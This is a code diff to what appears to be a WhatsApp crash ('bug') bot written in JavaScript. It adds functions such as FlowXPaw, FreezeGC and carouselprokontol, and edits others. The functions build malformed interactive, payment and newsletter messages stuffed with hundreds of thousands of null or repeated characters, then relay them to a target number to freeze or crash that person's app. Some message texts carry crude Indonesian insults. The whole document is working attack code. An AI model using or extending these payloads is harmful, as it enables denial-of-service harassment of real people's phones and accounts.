@@ -1879,7 +1879,7 @@ const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.ra
                   hasMediaAttachment: true, 
                 },
                 body: { 
-                  text: "Minat gk sama kucing ku🤣"
+                  text: "ㅤㅤㅤㅤㅤ"
                 },
                 footer: {
                   text: "ㅤㅤㅤㅤㅤ"
@@ -1904,7 +1904,7 @@ const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.ra
                     },
                     nativeFlowResponseMessage: {
                       name: "review_and_pay",
-                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
+                      paramsJson: "\u0000".repeat(510000),
                       version: 3
                     }
                   }
@@ -2372,7 +2372,7 @@ target,
 {
 interactiveMessage: {
 header: {
-title: "🦠⃰‌°‌‌•⃟‌𝐗𝐊‌𝐈𝐋𝐔‌𝚫-𝐂‌𝐋𝐈⃨𝐄𝐍‌‌𝐓 ⿻ 𝐗 ✶ > 666",
+title: "\u0000".repeat(510000),
 hasMediaAttachment: false
 },
 body: {
@@ -2540,6 +2540,102 @@ async function VampAttack(target) {
 
     await sock.relayMessage(target, msg.message, { participant: { jid: target } }, { messageId: null });
 }
+async function carouselprokontol(target) {
+    let messageContent = generateWAMessageFromContent(target, {
+      'viewOnceMessage': {
+        'message': {
+          'messageContextInfo': {
+            'deviceListMetadata': {},
+            'deviceListMetadataVersion': 2
+          },
+          'interactiveMessage': proto.Message.InteractiveMessage.create({
+            'body': proto.Message.InteractiveMessage.Body.create({
+              'text': 'kontol bapak kau pecah by ryzen dek'
+            }),
+            'footer': proto.Message.InteractiveMessage.Footer.create({
+              'text': ''
+            }),
+            'header': proto.Message.InteractiveMessage.Header.create({
+              'title': 'kontol bapak kau pecah by ryzen dek',
+              'subtitle': 'kontol bapak kau pecah by ryzen dek',
+              'hasMediaAttachment': false
+            }),
+            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(100000)
+            })
+          })
+        }
+      }
+    }, {});
+    sock.relayMessage(target, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
+}
+async function FlowXPaw(target) {
+
+     let msg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "",
+                                "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+                                hasMediaAttachment: false,
+                            },
+                            body: {
+                                text: "𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋💀",
+                            },
+                            nativeFlowMessage: {
+                                messageParamsJson: "",
+                                buttons: [{
+                                        name: "single_select",
+                                        buttonParamsJson: "BarzXForce" + "\u0000",
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "BarzXForce" + "\u0000",
+                                        },
+                                        {
+                                                                                name: "single_select",
+                                        buttonParamsJson: "andreforce" + "\u0000",
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "BarzXForce" + "\u0000",
+                                        },
+                                        {
+                                        name: "review_and_pay", buttonParamsJson: "BarzXForce" + "\u0003".repeat(9999) },
+                        { name: "galaxy_message", buttonParamsJson: "BarzXForce" + "\u0003".repeat(9999) },
+                        { name: "cta_call", buttonParamsJson: "BarzXForce" + "\u0003".repeat(9999) 
+                                    }
+                                ]
+                            }
+                        }
+                    }
+                }
+            }, {});
+
+            await sock.relayMessage(target, msg.message, {
+                messageId: msg.key.id,
+                participant: { jid: target }
+            });
+        }
+        async function FreezeGC(target) {
+       sock.relayMessage(target, {
+             newsletterAdminInviteMessage: {
+           newsletterJid: "120363400307044967@newsletter",
+           newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "GabutDoang".repeat(9000),
+           caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "GabutDoang".repeat(9000),
+           inviteExpiration: "0",
+          },
+          }, {
+            userJid: target
+       })
+       }
 async function frezbuttoninvis(target) {
     const spamMessage = "@1".repeat(10200);
     const crashMessage = "ꦽ".repeat(10200);
@@ -2650,6 +2746,7 @@ async function delay(sock, target) {
 }
 async function pedox(sock, target) {
   for (let i = 0; i < 1; i++) {
+      await FreezeGC(target);
       await Cursormuani(target);
       console.log(chalk.red("Send Bug Succes"))
   }
